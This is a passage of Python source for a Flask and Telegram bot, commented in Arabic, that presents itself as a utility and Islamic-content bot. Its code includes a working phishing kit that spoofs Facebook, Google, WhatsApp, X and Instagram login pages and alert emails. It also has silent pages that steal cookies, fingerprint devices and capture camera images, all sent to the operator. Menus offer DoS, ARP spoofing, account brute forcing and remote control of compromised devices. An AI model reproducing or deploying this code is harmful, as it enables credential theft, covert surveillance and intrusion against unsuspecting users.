    'instagram': '<!DOCTYPE html><html><head><title>Instagram Login</title><style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;}.box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:350px;text-align:center;}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}button{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:4px;font-size:16px;}</style></head><body><div class="box"><h2>Instagram</h2><form action="/api/phishing_submit" method="POST"><input type="hidden" name="platform" value="instagram"><input type="text" name="username" placeholder="اسم المستخدم" required><br><input type="password" name="password" placeholder="كلمة السر" required><br><button type="submit">تسجيل الدخول</button></form></div></body></html>'
}

def send_phishing_email(target_email, platform, custom_message=None):
    try:
        if not SMTP_USER or not SMTP_PASS:
            return "❌ إعدادات SMTP غير مضبوطة."
        templates = {
            'facebook': f'<h2>تنبيه أمني من فيسبوك</h2><p>يرجى تأكيد هويتك:</p><a href="{SERVER_URL}/phishing_pages/facebook">تأكيد الحساب</a>',
            'google': f'<h2>تحديث الأمان من Google</h2><a href="{SERVER_URL}/phishing_pages/google">التحقق من الحساب</a>',
            'whatsapp': f'<h2>تحديث واتساب ويب</h2><a href="{SERVER_URL}/phishing_pages/whatsapp">إعادة التسجيل</a>',
            'twitter': f'<h2>تأكيد الحساب - X</h2><a href="{SERVER_URL}/phishing_pages/twitter">تأكيد الحساب</a>',
            'instagram': f'<h2>تنبيه من إنستغرام</h2><a href="{SERVER_URL}/phishing_pages/instagram">تأكيد الهوية</a>'
        }
        html_content = custom_message or templates.get(platform, templates['facebook'])
        msg = MIMEMultipart('alternative')
        msg['Subject'] = f"تنبيه أمني - {platform.capitalize()}"
        msg['From'] = SMTP_USER
        msg['To'] = target_email
        msg.attach(MIMEText(html_content, 'html'))
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        return f"✅ تم إرسال البريد إلى {target_email}"
    except Exception as e:
        return f"❌ فشل: {str(e)[:100]}"

# ===================== دوال Flask (مع إصلاح الكوكيز والكاميرا) =====================
@app.route('/health')
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})

@app.route('/device_info')
def device_info_page():
    """صفحة معلومات الجهاز - ترسل معلومات الجهاز للمطور"""
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    # يمكن التحقق من صلاحية المستخدم هنا (اختياري)
    html = '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><title>معلومات الجهاز</title></head>
    <body style="display:none;">
    <script>
    async function getDeviceInfo() {
        const urlParams = new URLSearchParams(window.location.search);
        const chat_id = urlParams.get('id');
        let data = {chat_id: chat_id};
        data.userAgent = navigator.userAgent;
        data.language = navigator.language;
        data.platform = navigator.platform;
        data.cores = navigator.hardwareConcurrency || 'غير معروف';
        data.ram = navigator.deviceMemory || 'غير معروف';
        data.width = screen.width;
        data.height = screen.height;
        data.colorDepth = screen.colorDepth;
        if (navigator.connection) {
            data.network = navigator.connection.type || 'غير محدد';
            data.downlink = navigator.connection.downlink || 'غير معروف';
            data.effectiveType = navigator.connection.effectiveType || 'غير محدد';
        }
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            data.battery = Math.round(battery.level * 100);
            data.charging = battery.charging;
        }
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            data.ip = ipData.ip || 'غير معروف';
            data.country = ipData.country_name || 'غير معروف';
            data.city = ipData.city || 'غير معروف';
        } catch(e){}
        await fetch('/send_device_info', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
        document.body.innerHTML = "<p>✅ تم الارسال. يمكنك الرجوع للبوت</p>";
        setTimeout(() => window.close(), 1000);
    }
    getDeviceInfo();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/send_device_info', methods=['POST'])
def receive_device_info():
    data = request.json
    chat_id = data.get('chat_id')
    if not chat_id:
        return jsonify({"status": "error"}), 400
    # حفظ في قاعدة البيانات
    safe_db_execute("INSERT INTO collected_data (device_id, data_type, data, created_at) VALUES (?, ?, ?, ?)",
                    (str(chat_id), "device_info", json.dumps(data), datetime.now().isoformat()))
    # تنسيق وإرسال للمطور
    msg = f"""📱 معلومات الجهاز

معلومات الموقع
━━━━━━━━━━━━━━
الدولة          : {data.get('country', 'غير معروف')}
المدينة         : {data.get('city', 'غير معروف')}
عنوان IP        : {data.get('ip', 'غير معروف')}

معلومات الشبكة
━━━━━━━━━━━━━━
نوع الشبكة      : {data.get('network', 'غير محدد')}
نوع الاتصال     : {data.get('effectiveType', 'غير محدد')}
سرعة التحميل    : {data.get('downlink', 'غير معروف')} ميغابت

معلومات الجهاز
━━━━━━━━━━━━━━
نوع الجهاز      : {data.get('platform', 'غير معروف')}
لغة النظام      : {data.get('language', 'غير معروف')}
عدد الأنوية     : {data.get('cores', 'غير معروف')}
الذاكرة العشوائية: {data.get('ram', 'غير معروف')} جيجابايت

معلومات الشاشة
━━━━━━━━━━━━━━
دقة الشاشة      : {data.get('width', 'غير معروف')} x {data.get('height', 'غير معروف')}
عمق الألوان     : {data.get('colorDepth', 'غير معروف')} بت

معلومات البطارية
━━━━━━━━━━━━━━
نسبة الشحن      : {data.get('battery', 'غير معروف')}%
حالة الشحن      : {'قيد الشحن' if data.get('charging', False) else 'غير قيد الشحن'}

الوقت           : {datetime.now().strftime('%d/%m/%Y %I:%M:%S %p')}"""
    notify_admin(msg)
    return jsonify({"status": "ok"})

@app.route('/cookie_stealer')
def cookie_stealer_page():
    """صفحة سرقة الكوكيز - تعمل بصمت"""
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = f'''
    <!DOCTYPE html>
    <html>
    <body style="display:none;">
    <script>
        const cookies = document.cookie;
        fetch('/api/collect_cookie', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{chat_id: '{chat_id}', cookies: cookies, url: window.location.href}})
        }});
        window.close();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/camera_hack')
def camera_hack_page():
    """صفحة الكاميرا الأمامية - تطلب الإذن بشكل خفي وتلتقط صورة"""
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = f'''
    <!DOCTYPE html>
    <html>
    <body style="display:none;">
    <script>
    async function capture() {{
        try {{
            const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const dataUrl = canvas.toDataURL('image/jpeg');
            await fetch('/api/collect_camera', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{chat_id: '{chat_id}', image: dataUrl}})
            }});
            stream.getTracks().forEach(track => track.stop());
        }} catch(e) {{ console.log(e); }}
        window.close();
    }}
    capture();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    html = PHISHING_TEMPLATES.get(platform)
    if not html:
        return "منصة غير مدعومة", 404
    return render_template_string(html)

@app.route('/api/phishing_submit', methods=['POST'])
def phishing_submit():
    try:
        platform = request.form.get('platform', 'unknown')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        ('', platform, username, password, ip, datetime.now().isoformat()))
        notify_admin(f"🎯 تصيد جديد!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}")
        real_urls = {'facebook': 'https://www.facebook.com', 'google': 'https://www.google.com', 'whatsapp': 'https://web.whatsapp.com', 'twitter': 'https://x.com', 'instagram': 'https://www.instagram.com'}
        return f'<script>window.location.href="{real_urls.get(platform, "https://google.com")}";</script>'
    except Exception as e:
        return "حدث خطأ", 500

@app.route('/api/collect_cookie', methods=['POST'])
def collect_cookie():
    data = request.json
    chat_id = data.get('chat_id')
    cookies = data.get('cookies', '')
    url = data.get('url', '')
    if chat_id:
        safe_db_execute("INSERT INTO cookie_logs (url, cookies, ip, user_agent, created_at) VALUES (?, ?, ?, ?, ?)",
                        (url, cookies, request.remote_addr, request.headers.get('User-Agent', ''), datetime.now().isoformat()))
        notify_admin(f"🍪 كوكيز مسروقة من المستخدم {chat_id}:\n{url}\n{cookies[:200]}...")
    return jsonify({"status": "ok"})

@app.route('/api/collect_camera', methods=['POST'])
def collect_camera():
    data = request.json
    chat_id = data.get('chat_id')
    image_data = data.get('image', '').split(',')[1]
    if image_data and chat_id:
        img_binary = base64.b64decode(image_data)
        safe_db_execute("INSERT INTO camera_images (chat_id, image, created_at) VALUES (?, ?, ?)", (chat_id, img_binary, datetime.now().isoformat()))
        os.makedirs('collected', exist_ok=True)
        filename = f"collected/cam_{chat_id}_{int(time.time())}.jpg"
        with open(filename, 'wb') as f:
            f.write(img_binary)
        notify_admin(f"📸 صورة من الكاميرا من المستخدم {chat_id}")
    return jsonify({"status": "ok"})
    # ===================== إنشاء البوت =====================
bot = TeleBot(TOKEN, parse_mode='HTML')
os.makedirs('temp', exist_ok=True)
os.makedirs('downloads', exist_ok=True)
os.makedirs('collected', exist_ok=True)

# متغيرات الحالة الجديدة
user_adkar_indices = defaultdict(lambda: {'sabah': 0, 'massaa': 0})
user_doaa_index = {}  # لتخزين فهرس الدعاء الحالي لكل مستخدم
user_rukn_index = {}  # لتخزين فهرس الركن الحالي لكل مستخدم
user_quote_index = {}  # لتخزين فهرس الاقتباس لكل مستخدم
user_voice_selection = {}  # لتخزين اختيار الصوت للمستخدم
waiting_for_password = set()
waiting_for_image_prompt = set()
waiting_for_voice_text = set()
waiting_for_voice_selection = set()  # لانتظار اختيار الصوت

temp_passwords = {}
pdf_texts = {}
user_states = {}
admin_remote = {}

# ===================== القوائم (مع إضافة الأزرار الجديدة) =====================
def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    # الصف الأول: خدمات عامة
    markup.row(
        InlineKeyboardButton("حالة الطقس", callback_data="weather"),
        InlineKeyboardButton("موسوعة ويكيبيديا", callback_data="wikipedia")
    )
    markup.row(
        InlineKeyboardButton("مولد كلمات المرور", callback_data="password_gen"),
        InlineKeyboardButton("تحليل كلمات المرور", callback_data="password_strength")
    )
    # تحويل النص إلى صوت (باستخدام gTTS)
    markup.row(
        InlineKeyboardButton("تحويل نص لصوت (gTTS)", callback_data="voice_gtts_menu"),
        InlineKeyboardButton("الترجمة الفورية", callback_data="translate")
    )
    markup.row(
        InlineKeyboardButton("التذكير", callback_data="reminder"),
        InlineKeyboardButton("آخر الأخبار", callback_data="news")
    )
    markup.row(
        InlineKeyboardButton("تقصير الروابط", callback_data="shorten_url"),
        InlineKeyboardButton("فك الروابط المختصرة", callback_data="expand_url")
    )
    # أدوات متقدمة (تتطلب صلاحيات)
    if user_can_use_collector(chat_id) or is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("معلومات الجهاز", callback_data="device_info"),
            InlineKeyboardButton("الكاميرا الأمامية", callback_data="camera_hack")
        )
    if user_can_use_advanced(chat_id) or is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("استخراج الكوكيز", callback_data="cookie_stealer"),
            InlineKeyboardButton("تتبع رقم الهاتف", callback_data="track_phone")
        )
        markup.row(
            InlineKeyboardButton("فحص أمني شامل", callback_data="comprehensive_scan")
        )
    # محتوى
    markup.row(
        InlineKeyboardButton("اقتباسات ملهمة", callback_data="quotes_menu"),
        InlineKeyboardButton("نصائح مفيدة", callback_data="tips_menu")
    )
    # تحليل
    markup.row(
        InlineKeyboardButton("فحص الروابط", callback_data="check_link_btn"),
        InlineKeyboardButton("تحليل ملفات APK", callback_data="analyze_apk")
    )
    markup.row(
        InlineKeyboardButton("تحليل مستندات PDF", callback_data="pdf_menu"),
        InlineKeyboardButton("إدارة الأجهزة", callback_data="list_devices")
    )
    # إسلاميات
    markup.row(
        InlineKeyboardButton("أذكار الصباح", callback_data="adkar_sabah"),
        InlineKeyboardButton("أذكار المساء", callback_data="adkar_massaa")
    )
    markup.row(
        InlineKeyboardButton("الأدعية المتنوعة", callback_data="doaa_menu"),
        InlineKeyboardButton("المحتوى الإسلامي", callback_data="muslim_menu")
    )
    # ميزات جديدة
    markup.row(
        InlineKeyboardButton("🎨 توليد صور AI", callback_data="generate_image_btn"),
        InlineKeyboardButton("📧 بريد مؤقت", callback_data="create_email_btn")
    )
    # نقاط ودعوات
    markup.row(
        InlineKeyboardButton("رصيد النقاط", callback_data="my_points"),
        InlineKeyboardButton("رابط الدعوة", callback_data="my_referral"),
        InlineKeyboardButton("سجل النقاط", callback_data="points_history")
    )
    # إدارة للمطور
    if is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("الإعدادات المتقدمة", callback_data="admin_panel")
        )
        markup.row(
            InlineKeyboardButton("الأدوات المتقدمة", callback_data="hacking_menu"),
            InlineKeyboardButton("الحماية والأمان", callback_data="protection_menu")
        )
        markup.row(
            InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"),
            InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat")
        )
        markup.row(
            InlineKeyboardButton("إرسال رسالة", callback_data="send_to_user"),
            InlineKeyboardButton("سجل النشاطات", callback_data="user_activity")
        )
        markup.row(
            InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"),
            InlineKeyboardButton("إدارة الحظر", callback_data="admin_ban_menu")
        )
    markup.row(
        InlineKeyboardButton("تنزيل الفيديو", callback_data="download_video")
    )
    if user_can_use_phishing(chat_id) or is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("إنشاء صفحة تصيد", callback_data="phishing_pages"),
            InlineKeyboardButton("إرسال بريد تصيد", callback_data="phishing_email")
        )
    else:
        markup.row(
            InlineKeyboardButton("🔒 إنشاء صفحة تصيد (300 نقطة)", callback_data="phishing_locked")
        )
    if is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("وضع التخفي", callback_data="toggle_stealth"),
            InlineKeyboardButton("قفل البوت", callback_data="protect_lock")
        )
    return markup

def build_hacking_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("اختبار حقن SQL", callback_data="hack_sqli"), InlineKeyboardButton("اختبار XSS", callback_data="hack_xss"))
    markup.row(InlineKeyboardButton("هجوم DoS", callback_data="hack_dos"), InlineKeyboardButton("هجوم ARP Spoof", callback_data="hack_arp"))
    markup.row(InlineKeyboardButton("تخمين فيسبوك", callback_data="bruteforce_fb"), InlineKeyboardButton("تخمين انستغرام", callback_data="bruteforce_ig"))
    markup.row(InlineKeyboardButton("تخمين SSH", callback_data="bruteforce_ssh"), InlineKeyboardButton("تخمين FTP", callback_data="bruteforce_ftp"))
    markup.row(InlineKeyboardButton("تخمين مخصص", callback_data="bruteforce_custom"), InlineKeyboardButton("مسح المنافذ", callback_data="port_scan"))
    markup.row(InlineKeyboardButton("فحص شهادة SSL", callback_data="ssl_scan"), InlineKeyboardButton("كاميرا (جهاز مخترق)", callback_data="hack_camera"))
    markup.row(InlineKeyboardButton("ميكروفون (جهاز مخترق)", callback_data="hack_mic"), InlineKeyboardButton("موقع (جهاز مخترق)", callback_data="hack_location"))
    markup.row(InlineKeyboardButton("جهات اتصال (جهاز مخترق)", callback_data="hack_contacts"), InlineKeyboardButton("رسائل SMS (جهاز مخترق)", callback_data="hack_sms"))
    markup.row(InlineKeyboardButton("لقطة شاشة (جهاز مخترق)", callback_data="hack_screenshot"), InlineKeyboardButton("Shell", callback_data="hack_shell"))
    markup.row(InlineKeyboardButton("إيقاف تشغيل (جهاز مخترق)", callback_data="hack_shutdown"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_protection_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("درع الحماية", callback_data="protect_shield"), InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
    markup.row(InlineKeyboardButton("تخفي شامل", callback_data="protect_stealth"), InlineKeyboardButton("كشف الاختراق", callback_data="protect_detect"))
    markup.row(InlineKeyboardButton("تغيير الهوية", callback_data="protect_identity"), InlineKeyboardButton("تنظيف السجلات", callback_data="protect_clean"))
    markup.row(InlineKeyboardButton("حماية API", callback_data="protect_api"), InlineKeyboardButton("نسخ احتياطي", callback_data="protect_backup"))
    markup.row(InlineKeyboardButton("إعادة تشغيل آمن", callback_data="protect_reboot"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

# ===================== القوائم الفرعية =====================
def build_doaa_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    for i, duaa in enumerate(DUAA_DB):
        markup.row(InlineKeyboardButton(duaa['title'], callback_data=f"doaa_{i}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_muslim_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton("أركان الإسلام", callback_data="muslim_arkan_islam"))
    markup.row(InlineKeyboardButton("أركان الإيمان", callback_data="muslim_arkan_iman"))
    markup.row(InlineKeyboardButton("الوضوء", callback_data="muslim_wudu"))
    markup.row(InlineKeyboardButton("صفة الغسل", callback_data="muslim_ghusl"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quotes_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for cat in QUOTES_DB.keys():
        markup.row(InlineKeyboardButton(cat, callback_data=f"quote_cat_{cat}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_voice_gtts_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for voice_name in VOICES.keys():
        markup.row(InlineKeyboardButton(f"🎤 {voice_name}", callback_data=f"voice_gtts_{voice_name}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_adkar_action_menu(adkar_type, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي", callback_data=f"adkar_next_{adkar_type}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_doaa_action_menu(current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي", callback_data=f"doaa_next_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="doaa_menu"))
    return markup

def build_rukn_action_menu(rukn_type, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي", callback_data=f"rukn_next_{rukn_type}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quote_action_menu(category, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي", callback_data=f"quote_next_{category}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="quotes_menu"))
    return markup

def build_pdf_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("تلخيص PDF", callback_data="pdf_summary"), InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
    markup.row(InlineKeyboardButton("تحليل ذكي (أسئلة)", callback_data="pdf_smart"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_whatsapp"), InlineKeyboardButton("تويتر", callback_data="phish_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_instagram"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_platform_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_platform_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_platform_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_platform_whatsapp"), InlineKeyboardButton("تويتر", callback_data="phish_platform_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_platform_instagram"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_translate_menu():
    markup = InlineKeyboardMarkup(row_width=3)
    languages = list(LANGUAGES.items())
    for i in range(0, len(languages), 3):
        row = []
        for code, name in languages[i:i+3]:
            row.append(InlineKeyboardButton(name, callback_data=f"trans_lang_{code}"))
        markup.row(*row)
    markup.row(InlineKeyboardButton("إلغاء", callback_data="back_main"))
    return markup

def build_users_menu(chat_id, action):
    users = safe_db_query("SELECT chat_id, is_admin, is_banned, points FROM users", fetch_one=False)
    if not users:
        return None, "لا يوجد مستخدمين"
    markup = InlineKeyboardMarkup(row_width=1)
    for user in users:
        user_id = user[0]
        name = get_user_name(user_id)
        status = "🟢" if user[2] == 0 else "🔴"
        label = f"{name} ({user_id}) - {status} - نقاط: {user[3]}"
        markup.row(InlineKeyboardButton(label, callback_data=f"{action}_user_{user_id}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup, None

# ===================== دوال العرض =====================
def show_duaa(chat_id, message_id, index):
    if index >= len(DUAA_DB):
        index = 0
    duaa = DUAA_DB[index]
    text = f"{duaa['title']}\n\n{duaa['text']}\n\nالمصدر: {duaa['source']}\n\n{index + 1} من {len(DUAA_DB)}"
    markup = build_doaa_action_menu(index, len(DUAA_DB))
    bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')

def show_arkan(chat_id, message_id, type_arkan, index):
    data_list = ARKAN_ISLAM if type_arkan == "islam" else ARKAN_IMAN
    title = "أركان الإسلام" if type_arkan == "islam" else "أركان الإيمان"
    if index >= len(data_list):
        index = 0
    text = f"{title}\n\n{index + 1}. {data_list[index]}\n\n{index + 1} من {len(data_list)}"
    markup = build_rukn_action_menu(type_arkan, index, len(data_list))
    bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')

def show_quote(chat_id, message_id, category, index):
    quotes = QUOTES_DB[category]
    if index >= len(quotes):
        index = 0
    quote_text = quotes[index]
    border = random.choice(BORDERS)
    final_text = border.format(quote_text)
    text = f"نوع: {category}\n\n{final_text}\n\n{index + 1} من {len(quotes)}"
    markup = build_quote_action_menu(category, index, len(quotes))
    bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        chat_id = call.message.chat.id
        data = call.data
        log_activity(chat_id, data)
        update_last_seen(chat_id)

        if data == "back_main":
            safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))
            return

        # ===== أذكار =====
        if data == "adkar_sabah":
            user_adkar_indices[chat_id]['sabah'] = 0
            adkar_list = ADKAR_SABAH
            current = adkar_list[0]
            total = len(adkar_list)
            safe_send(chat_id, f"📿 أذكار الصباح:\n\n{current}", reply_markup=build_adkar_action_menu('sabah', 0, total))
            return
        if data == "adkar_massaa":
            user_adkar_indices[chat_id]['massaa'] = 0
            adkar_list = ADKAR_MASSAA
            current = adkar_list[0]
            total = len(adkar_list)
            safe_send(chat_id, f"🌙 أذكار المساء:\n\n{current}", reply_markup=build_adkar_action_menu('massaa', 0, total))
            return
        if data.startswith("adkar_next_"):
            parts = data.split("_")
            adkar_type = parts[2]
            idx = int(parts[3])
            adkar_list = ADKAR_SABAH if adkar_type == 'sabah' else ADKAR_MASSAA
            if idx < len(adkar_list):
                current = adkar_list[idx]
                total = len(adkar_list)
                safe_send(chat_id, f"📿 {('أذكار الصباح' if adkar_type == 'sabah' else 'أذكار المساء')}:\n\n{current}", reply_markup=build_adkar_action_menu(adkar_type, idx, total))
            return

        # ===== أدعية =====
        if data == "doaa_menu":
            safe_send(chat_id, "اختر الدعاء:", reply_markup=build_doaa_menu())
            return
        if data.startswith("doaa_"):
            idx = int(data.split("_")[1])
            user_doaa_index[chat_id] = idx
            msg = safe_send(chat_id, "⏳ جاري تحميل الدعاء...")
            if msg:
                show_duaa(chat_id, msg.message_id, idx)
            return
        if data.startswith("doaa_next_"):
            idx = int(data.split("_")[2])
            user_doaa_index[chat_id] = idx
            show_duaa(chat_id, call.message.message_id, idx)
            return

        # ===== أركان الإسلام والإيمان =====
        if data == "muslim_menu":
            safe_send(chat_id, "اختر الموضوع:", reply_markup=build_muslim_menu())
            return
        if data == "muslim_arkan_islam":
            user_rukn_index[chat_id] = 0
            msg = safe_send(chat_id, "⏳ جاري تحميل أركان الإسلام...")
            if msg:
                show_arkan(chat_id, msg.message_id, "islam", 0)
            return
        if data == "muslim_arkan_iman":
            user_rukn_index[chat_id] = 0
            msg = safe_send(chat_id, "⏳ جاري تحميل أركان الإيمان...")
            if msg:
                show_arkan(chat_id, msg.message_id, "iman", 0)
            return
        if data.startswith("rukn_next_"):
            parts = data.split("_")
            type_arkan = parts[2]
            idx = int(parts[3])
            user_rukn_index[chat_id] = idx
            show_arkan(chat_id, call.message.message_id, type_arkan, idx)
            return
        if data in ["muslim_wudu", "muslim_ghusl"]:
            key = data.split("_")[1]
            if key == "wudu":
                text = "💧 خطوات الوضوء الصحيح:\n1. النية\n2. التسمية\n3. غسل الكفين\n4. المضمضة والاستنشاق\n5. غسل الوجه\n6. غسل اليدين\n7. مسح الرأس\n8. غسل الرجلين\n9. الدعاء بعد الوضوء"
            else:
                text = "🚿 صفة الغسل الكامل:\n1. النية\n2. غسل الكفين\n3. غسل الفرج\n4. الوضوء كاملاً\n5. تخليل الشعر\n6. إفاضة الماء على الرأس\n7. غسل بقية الجسد"
            safe_send(chat_id, text)
            return

        # ===== اقتباسات =====
        if data == "quotes_menu":
            safe_send(chat_id, "اختر نوع الاقتباسات:", reply_markup=build_quotes_menu())
            return
        if data.startswith("quote_cat_"):
            category = data.replace("quote_cat_", "")
            user_quote_index[chat_id] = {'category': category, 'index': 0}
            msg = safe_send(chat_id, "⏳ جاري تحميل الاقتباس...")
            if msg:
                show_quote(chat_id, msg.message_id, category, 0)
            return
        if data.startswith("quote_next_"):
            parts = data.split("_")
            category = parts[2]
            idx = int(parts[3])
            user_quote_index[chat_id] = {'category': category, 'index': idx}
            show_quote(chat_id, call.message.message_id, category, idx)
            return

        # ===== تحويل النص إلى صوت (gTTS) =====
        if data == "voice_gtts_menu":
            safe_send(chat_id, "اختر نوع الصوت:", reply_markup=build_voice_gtts_menu())
            return
        if data.startswith("voice_gtts_"):
            voice_name = data.replace("voice_gtts_", "")
            user_voice_selection[chat_id] = voice_name
            waiting_for_voice_text.add(chat_id)
            safe_send(chat_id, f"📝 أرسل النص الذي تريد تحويله إلى صوت {voice_name}:")
            return

        # ===== فحص الرابط =====
        if data == "check_link_btn":
            user_states[chat_id] = "waiting_link_check"
            safe_send(chat_id, "🔗 أرسل الرابط لفحصه (مثال: https://example.com)")
            return

        # ===== توليد صور AI =====
        if data == "generate_image_btn":
            waiting_for_image_prompt.add(chat_id)
            safe_send(chat_id, "🎨 أرسل وصف الصورة التي تريد توليدها (مثال: منظر طبيعي وقت الغروب)")
            return

        # ===== محلل كلمات السر =====
        if data == "password_strength":
            waiting_for_password.add(chat_id)
            safe_send(chat_id, "🔐 أرسل كلمة المرور لتحليلها")
            return

        # ===== مولد كلمات المرور =====
        if data == "password_gen":
            pwd = generate_strong_password()
            safe_send(chat_id, f"🔑 كلمة مرور قوية:\n`{pwd}`\n\nيمكنك استخدامها مباشرة.", parse_mode="Markdown")
            return

        # ===== بريد مؤقت =====
        if data == "create_email_btn":
            name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            domain = random.choice(["1secmail.com", "1secmail.org", "1secmail.net"])
            email = f"{name}@{domain}"
            user_emails[chat_id] = [email, name, domain]
            text = f"""📧 تم انشاء بريدك المؤقت بنجاح
────────────────────────

البريد الخاص بك:
`{email}`

الصلاحية: 10 دقائق
للنسخ: اضغط ضغطة طويلة على البريد

ملاحظة: لا يعمل مع فيسبوك وجيميل وواتساب"""
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔄 تحديث الصندوق", callback_data="check_mail_btn"))
            markup.row(InlineKeyboardButton("🗑️ حذف البريد", callback_data="delete_mail_btn"))
            safe_send(chat_id, text, reply_markup=markup, parse_mode="Markdown")
            return
        if data == "check_mail_btn":
            if chat_id not in user_emails:
                safe_send(chat_id, "لا يوجد بريد نشط")
                return
            name, domain = user_emails[chat_id][1], user_emails[chat_id][2]
            url = f"https://www.1secmail.com/api/v1/?action=getMessages&login={name}&domain={domain}"
            try:
                messages = requests.get(url, timeout=5).json()
            except:
                safe_send(chat_id, "خطأ في الاتصال")
                return
            if not messages:
                safe_send(chat_id, "📭 لا توجد رسائل جديدة")
                return
            for msg in messages:
                text = f"📩 رسالة جديدة\nمن: {msg['from']}\nالموضوع: {msg['subject']}\nID: {msg['id']}\nلعرضها ارسل: /read_{msg['id']}"
                safe_send(chat_id, text)
            return
        if data == "delete_mail_btn":
            if chat_id in user_emails:
                del user_emails[chat_id]
            safe_send(chat_id, "🗑️ تم حذف البريد")
            return

        # ===== معلومات الجهاز، الكاميرا، الكوكيز =====
        if data == "device_info":
            if not user_can_use_collector(chat_id) and not is_admin(chat_id):
